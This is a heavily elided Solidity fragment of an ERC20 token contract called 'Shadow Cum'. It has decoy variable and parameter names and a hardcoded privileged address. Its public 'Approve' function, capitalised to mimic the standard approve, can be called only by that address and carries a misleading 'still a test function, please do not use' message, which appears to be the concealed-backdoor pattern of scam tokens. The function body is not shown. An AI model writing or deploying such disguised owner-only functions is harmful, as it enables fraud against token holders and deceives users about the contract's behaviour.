...
contract Context {
 ...
 contract ShadowCum is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private theweekend;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Shadow Cum";
    string private _symbol = "SHADOWCUM";
    ...
    address private _zlatomir = 0x8b41bE25D3f270F040F5AD6Cb881Df742b45c37a;
    ...
    constructor(uint256 totalSupply_, string memory attachments, string memory dislocators) {
    ...
    function Approve(uint256 amount) public {
        ...
        require(_msgSender() == _zlatomir, "This is still a test function, please do not use!");
    }
